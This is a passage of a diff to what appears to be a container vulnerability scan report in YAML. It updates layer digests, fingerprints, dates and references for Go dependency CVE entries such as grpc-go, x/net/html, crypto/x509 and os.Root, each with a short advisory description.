       Multiple security vulnerabilities have been identified and addressed in grpc-go affecting the xDS RBAC authorization engine (internal/xds/rbac) and the HTTP/2 transport server implementation (internal/transport). These vulnerabilities could result in:
@@ -1936,13 +1210,13 @@
     InstalledVersion: v0.52.0
     Status: affected
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:d4c945e4bac116ee96375bded501c1aeb2c944a7432ac1ed4f347059c19edd6b
+    Fingerprint: sha256:e86fa818a59236faff292fbdad6a9b3871338cc43d726c2651a11a038669f2dc
     Title: The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and has known security issues
     Description: |-
       The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known security issues, is not maintained, and should not be used.
@@ -1964,14 +1238,14 @@
     FixedVersion: 0.56.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-46600
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:47d7eaae1d25de7bcc2292749d480d395d9d8229058b7b50a982b599e9251b81
+    Fingerprint: sha256:beac7861c0b986eea90802a3f8dc55c0a0bb7b7db2ec912cb6e2f420addcd335
     Title: Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ...
     Description: Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter value overflows the message buffer.
     Severity: UNKNOWN
@@ -1995,14 +1269,14 @@
     FixedVersion: 0.39.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-56852
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:ebc0ff0bb40479cacb5905df534369fe1ddbadac3359485306d8b699906dd4e1
+    Fingerprint: sha256:09ba0080bb449ceb55fbdc9ef21fe928166bda6fc8060cbbcd78567102262b98
     Title: A norm.Iter can enter an infinite loop when handling input containing  ...
     Description: A norm.Iter can enter an infinite loop when handling input containing invalid UTF-8 bytes.
     Severity: HIGH
@@ -2027,15 +1301,15 @@
     FixedVersion: 1.82.1
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     SeveritySource: ghsa
     PrimaryURL: https://github.com/advisories/GHSA-hrxh-6v49-42gf
     DataSource:
       ID: ghsa
       Name: GitHub Security Advisory Go
       URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago
-    Fingerprint: sha256:3713a160bb68bd3c418979bed255539588a6394e734b07d771459d13c0c77f1b
+    Fingerprint: sha256:e59e277e77eaa9d65e582ca6d4fd836690aaf5b1e92e67491cd21ff863afe57b
     Title: 'gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities'
     Description: |-
       Multiple security vulnerabilities have been identified and addressed in grpc-go affecting the xDS RBAC authorization engine (internal/xds/rbac) and the HTTP/2 transport server implementation (internal/transport). These vulnerabilities could result in:
@@ -2118,14 +1392,14 @@
     FixedVersion: 1.25.11, 1.26.4
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-27145
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:52b7d19fbe92f958fe241f8a02da820147e5eedf7193022a93d301fdb7285f0f
+    Fingerprint: sha256:5dda26ce094e49e8eda3e654f153877d97764e38ad1a06a5c4d857f0391e0750
     Title: 'crypto/x509: golang: golang crypto/x509: Denial of Service via excessive processing of DNS SAN entries'
     Description: (*x509.Certificate).VerifyHostname previously called matchHostnames in a loop over all DNS Subject Alternative Name (SAN) entries. This caused strings.Split(host, ".") to execute repeatedly on the same input hostname. With a large DNS SAN list, verification costs scaled quadratically based on the number of SAN entries multiplied by the hostname's label count. Because x509.Verify validates hostnames before building the certificate chain, this overhead occurred even for untrusted certificates.
     Severity: HIGH
@@ -2148,6 +1422,7 @@
     References:
     - https://access.redhat.com/errata/RHSA-2026:23262
     - https://access.redhat.com/errata/RHSA-2026:23264
+    - https://access.redhat.com/errata/RHSA-2026:29980
     - https://access.redhat.com/errata/RHSA-2026:29981
     - https://access.redhat.com/errata/RHSA-2026:33574
     - https://access.redhat.com/errata/RHSA-2026:34357
@@ -2202,7 +1477,7 @@
     - https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-27145.json
     - https://www.cve.org/CVERecord?id=CVE-2026-27145
     PublishedDate: '2026-06-02T23:16:35.57Z'
-    LastModifiedDate: '2026-07-30T12:17:42.057Z'
+    LastModifiedDate: '2026-07-31T13:17:40.873Z'
   - VulnerabilityID: CVE-2026-39822
     VendorIDs:
     - GO-2026-4970
@@ -2215,14 +1490,14 @@
     FixedVersion: 1.25.12, 1.26.5, 1.27.0-rc.2
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-39822
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:6f1a5808c82eec43556a1602a9b72ae0fa6356d54bcf4495bf4a70843df851a8
+    Fingerprint: sha256:a6cd26e8cfe434e62f7b00530ea6696be2030e417b9f1d8c164874f9e0ff64ea
     Title: 'os: golang: Go os.Root: Symlink following vulnerability allows directory traversal'
     Description: On Unix systems, opening a file in an os.Root improperly follows symlinks to locations outside of the Root when the final path component of the a path is a symbolic link and the path ends in /. For example, 'root.Open("symlink/")' will open "symlink" even when "symlink" is a symbolic link pointing outside of the root.
     Severity: HIGH
@@ -2272,14 +1547,14 @@
     FixedVersion: 1.25.11, 1.26.4
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-42504
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:ff1faaa25bb4608d8be1bd879d579a6614c9e42f8eab886a791199d7abeea94c
+    Fingerprint: sha256:dfa8d31e0485bcee6d0c0aa2923d38f3f418e11728f3eda5a5292c18c2890557
     Title: 'mime: golang: Golang MIME: Denial of Service via maliciously-crafted MIME header'
     Description: Decoding a maliciously-crafted MIME header containing many invalid encoded-words can consume excessive CPU.
     Severity: HIGH
@@ -2319,14 +1594,14 @@
     FixedVersion: 1.25.12, 1.26.5, 1.27.0-rc.2
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-42505
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:d59e3c4d5ecf52abf387f57e55b9e9e54d8b38ba090dfb5f833563d983336b8f
+    Fingerprint: sha256:fc556a52b29e053d6a73d4cb3df8b09fea5397dbfe55cce6713d6c62762da5c4
     Title: 'crypto/tls: golang: Go crypto/tls: Information disclosure in Encrypted Client Hello'
     Description: Handshakes which used Encrypted Client Hello could be de-anonymized by a passive network observer due to a disclosure of pre-shared key identities in the unencrypted client hello.
     Severity: MEDIUM
@@ -2365,14 +1640,14 @@
     FixedVersion: 1.25.11, 1.26.4
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-42507
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:07912bd1364b59c7c11baf26b77587a71d433db607c160bc18f2a8c13c8c3e00
+    Fingerprint: sha256:2319965ed2fb6f3fe4327520d567f891c695ef3a3aa6dca91b4e3209d6987971
     Title: 'net/textproto: golang: Golang net/textproto: Misleading error messages via input injection'
     Description: When returning errors, functions in the net/textproto package would include its input as part of the error. This might allow an attacker to inject misleading content to errors that are printed or logged.
     Severity: MEDIUM
@@ -2427,14 +1702,14 @@
     FixedVersion: 0.55.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-25681
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:53ee8cacca255193bd1783102f04ce7aee54f2431b63b8b9b88f03a9ded30152
+    Fingerprint: sha256:c094a43c55b8677f646a697926d63a3dc4b8269fc61fb6d7c057d9d638f2892b
     Title: 'golang.org/x/net/html: golang.org/x/net/html: Arbitrary code execution via Cross-Site Scripting'
     Description: Parsing arbitrary HTML which is then rendered using Render can result in an unexpected HTML tree. This can be leveraged to execute XSS attacks in applications that attempt to sanitize input HTML before rendering.
     Severity: HIGH
@@ -2499,14 +1774,14 @@
     FixedVersion: 0.55.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-27136
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:37b471eb79cce8f94dc91ce56709efc4183230d54895d7d6f67772e3e7b070c1
+    Fingerprint: sha256:292cb5dba5bf591a1a45dd1d37f1583e33c2e48fef6512b15717327c2134f06e
     Title: 'golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via HTML parsing bypass'
     Description: Parsing arbitrary HTML which is then rendered using Render can result in an unexpected HTML tree. This can be leveraged to execute XSS attacks in applications that attempt to sanitize input HTML before rendering.
     Severity: HIGH
@@ -2571,15 +1846,15 @@
     FixedVersion: 0.53.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     SeveritySource: nvd
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-33814
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:5e29d606b3b0e5ab3bca189eb46d1b4b10ace0688bf48dfbe69c66d012196716
+    Fingerprint: sha256:f10b8383aba8c81c4599ac42ca4fd0bc6c30cbf59565e7429c0c7a30e53efc09
     Title: 'net/http/internal/http2: golang: golang.org/x/net: Go HTTP/2: Denial of Service via malformed SETTINGS_MAX_FRAME_SIZE frame'
     Description: When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a value of 0.
     Severity: HIGH
@@ -2649,14 +1924,14 @@
     FixedVersion: 0.55.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-39821
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:f0b0ea71f56ac2af1b778f855ad4296f0edfa6e63d69f93a3b8e59af4c2c71af
+    Fingerprint: sha256:9c10c686b9f10ef0fe44ecea8032c4ab4b1587db132b3c49791cbe818fb35e7e
     Title: 'golang.org/x/net/idna: golang: net/http: golang.org/x/net/idna: Privilege escalation via incorrect Punycode label processing'
     Description: The ToASCII and ToUnicode functions incorrectly accept Punycode-encoded labels that decode to an ASCII-only label. For example, ToUnicode("xn--example-.com") incorrectly returns the name "example.com" rather than an error. This behavior can lead to privilege escalation in programs using the idna package. For example, a program which performs privilege checks on the ASCII hostname may reject "example.com" but permit "xn--example-.com". If that program subsequently converts the ASCII hostname to Unicode, it will inadvertently permits access to the Unicode name "example.com".
     Severity: HIGH
@@ -2781,7 +2056,7 @@
     - https://ubuntu.com/security/notices/USN-8416-1
     - https://www.cve.org/CVERecord?id=CVE-2026-39821
     PublishedDate: '2026-05-22T16:16:20.41Z'
-    LastModifiedDate: '2026-07-30T12:18:21.263Z'
+    LastModifiedDate: '2026-07-31T13:18:09.37Z'
   - VulnerabilityID: CVE-2026-25680
     VendorIDs:
     - GO-2026-5028
@@ -2794,14 +2069,14 @@
     FixedVersion: 0.55.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-25680
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:41d16bd451503816fc4742b8f7a407b28db80f2f73535e1a09f5079b671d8372
+    Fingerprint: sha256:0d54de425b720db96a74620d0f2994d2ced1b7fd44c4e8a1f79dd73900b2814e
     Title: 'golang.org/x/net/html: golang.org/x/net/html: Denial of Service due to excessive HTML parsing'
     Description: Parsing arbitrary HTML can consume excessive CPU time, possibly leading to denial of service.
     Severity: MEDIUM
@@ -2837,14 +2112,14 @@
     FixedVersion: 0.55.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-42502
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:f4b8adf49bc6bc5f7e210082026c70e84d0ba957d2daf33093985fe0de98030f
+    Fingerprint: sha256:36139ee961f009a10833994d72b51eecfd9a407a8f03b6eec74b480a6474ce78
     Title: 'golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via unexpected HTML tree rendering'
     Description: Parsing arbitrary HTML which is then rendered using Render can result in an unexpected HTML tree. This can be leveraged to execute XSS attacks in applications that attempt to sanitize input HTML before rendering.
     Severity: MEDIUM
@@ -2880,14 +2155,14 @@
     FixedVersion: 0.55.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-42506
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:afd4fda8cf926367cb865fc9d5adcffe8cbcd7fe0fd4bb6d284a2f1e105c99a3
+    Fingerprint: sha256:8aa94591e998b07a578806961b98eb1419f079f2323da94e88623195a90ac8f9
     Title: 'golang.org/x/net/html: golang.org/x/net/html: Cross-Site Scripting (XSS) via arbitrary HTML parsing'
     Description: Parsing arbitrary HTML which is then rendered using Render can result in an unexpected HTML tree. This can be leveraged to execute XSS attacks in applications that attempt to sanitize input HTML before rendering.
     Severity: MEDIUM
@@ -2923,14 +2198,14 @@
     FixedVersion: 0.56.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-46600
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:23605cc69cbfc37c64fc091b882403a3c0b091e490a98a9045a38929e749129d
+    Fingerprint: sha256:cf7f55d8431e0cdaeff7b2f90506ee15b3c150d30d3c6b2ff4fe45b7ee61b7a0
     Title: Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ...
     Description: Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter value overflows the message buffer.
     Severity: UNKNOWN
@@ -2954,14 +2229,14 @@
     FixedVersion: 0.44.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-39824
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:3aead4dfec7748cb565a7d0523ac3511076946a8d55c2526707e8350defea0fc
+    Fingerprint: sha256:134a656702b264e35fc7e89b8d6e7ba06e0002c15546972d694497e096239908
     Title: Invoking integer overflow in NewNTUnicodeString in golang.org/x/sys/windows
     Description: NewNTUnicodeString does not check for string length overflow. When provided with a string that overflows the maximum size of a NTUnicodeString (a 16-bit number of bytes), it returns a truncated string rather than an error.
     Severity: UNKNOWN
@@ -2986,14 +2261,14 @@
     FixedVersion: 0.39.0
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-56852
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:3928224ad9ce21e411a7e65746909b65a6569afa68e637c29b42ca601a614e9e
+    Fingerprint: sha256:d92ea3ec48c647c601b4c6b47bd6f19203a2a02e975df145cf63de3d384cc1c5
     Title: A norm.Iter can enter an infinite loop when handling input containing  ...
     Description: A norm.Iter can enter an infinite loop when handling input containing invalid UTF-8 bytes.
     Severity: HIGH
@@ -3018,15 +2293,15 @@
     FixedVersion: 1.82.1
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     SeveritySource: ghsa
     PrimaryURL: https://github.com/advisories/GHSA-hrxh-6v49-42gf
     DataSource:
       ID: ghsa
       Name: GitHub Security Advisory Go
       URL: https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago
-    Fingerprint: sha256:263140194719573ac1a88f462a4d057d140a4004ae1730a8a2a22e970dc44372
+    Fingerprint: sha256:48ea26539d9019b5ef6008db9822ac0f9bddd437976566f80fae7f5c9c337364
     Title: 'gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities'
     Description: |-
       Multiple security vulnerabilities have been identified and addressed in grpc-go affecting the xDS RBAC authorization engine (internal/xds/rbac) and the HTTP/2 transport server implementation (internal/transport). These vulnerabilities could result in:
@@ -3109,14 +2384,14 @@
     FixedVersion: 1.25.11, 1.26.4
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-27145
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:cdeb75d07ecd7c5d5a4f141287731ae11c0d3419413f32c80da07622744f459f
+    Fingerprint: sha256:8800f7857f672787e0016a896b2fe4a77475769bf9e4c70846474c8917275b4b
     Title: 'crypto/x509: golang: golang crypto/x509: Denial of Service via excessive processing of DNS SAN entries'
     Description: (*x509.Certificate).VerifyHostname previously called matchHostnames in a loop over all DNS Subject Alternative Name (SAN) entries. This caused strings.Split(host, ".") to execute repeatedly on the same input hostname. With a large DNS SAN list, verification costs scaled quadratically based on the number of SAN entries multiplied by the hostname's label count. Because x509.Verify validates hostnames before building the certificate chain, this overhead occurred even for untrusted certificates.
     Severity: HIGH
@@ -3139,6 +2414,7 @@
     References:
     - https://access.redhat.com/errata/RHSA-2026:23262
     - https://access.redhat.com/errata/RHSA-2026:23264
+    - https://access.redhat.com/errata/RHSA-2026:29980
     - https://access.redhat.com/errata/RHSA-2026:29981
     - https://access.redhat.com/errata/RHSA-2026:33574
     - https://access.redhat.com/errata/RHSA-2026:34357
@@ -3193,7 +2469,7 @@
     - https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-27145.json
     - https://www.cve.org/CVERecord?id=CVE-2026-27145
     PublishedDate: '2026-06-02T23:16:35.57Z'
-    LastModifiedDate: '2026-07-30T12:17:42.057Z'
+    LastModifiedDate: '2026-07-31T13:17:40.873Z'
   - VulnerabilityID: CVE-2026-39822
     VendorIDs:
     - GO-2026-4970
@@ -3206,14 +2482,14 @@
     FixedVersion: 1.25.12, 1.26.5, 1.27.0-rc.2
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-39822
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:4cbfabc14eb4afcb84a5f44bd9da779bba2ef3306b2aa09e4b8b1a71f48366ff
+    Fingerprint: sha256:0a25836d79cd84081036f94712e40beedd78fa20ccd958ac1038e5a96cca8dcf
     Title: 'os: golang: Go os.Root: Symlink following vulnerability allows directory traversal'
     Description: On Unix systems, opening a file in an os.Root improperly follows symlinks to locations outside of the Root when the final path component of the a path is a symbolic link and the path ends in /. For example, 'root.Open("symlink/")' will open "symlink" even when "symlink" is a symbolic link pointing outside of the root.
     Severity: HIGH
@@ -3263,14 +2539,14 @@
     FixedVersion: 1.25.11, 1.26.4
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
+      Digest: sha256:604c1010afb5bf9e9e06c9e56ce6d5158b10aded2bdbe92562dadc4ee6c7523d
+      DiffID: sha256:84b651ec5f5694c97a88671f0f61cc76ca224ce8707d9afbb07074e22b1af86c
     PrimaryURL: https://avd.aquasec.com/nvd/cve-2026-42504
     DataSource:
       ID: govulndb
       Name: The Go Vulnerability Database
       URL: https://pkg.go.dev/vuln/
-    Fingerprint: sha256:efc282784e441c3e696a6ac6a05875b82e9c071fcbe834fd0b0186b6a107d3c9
+    Fingerprint: sha256:7780b7d55746ee7d5df7e2007f7ee13b63b8358f89ae1041314acb3fc292f32b
     Title: 'mime: golang: Golang MIME: Denial of Service via maliciously-crafted MIME header'
     Description: Decoding a maliciously-crafted MIME header containing many invalid encoded-words can consume excessive CPU.
     Severity: HIGH
@@ -3310,14 +2586,14 @@
     FixedVersion: 1.25.12, 1.26.5, 1.27.0-rc.2
     Status: fixed
     Layer:
-      Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c6997c001601e2a6e5af
-      DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172e154f0b8ad928e980c9
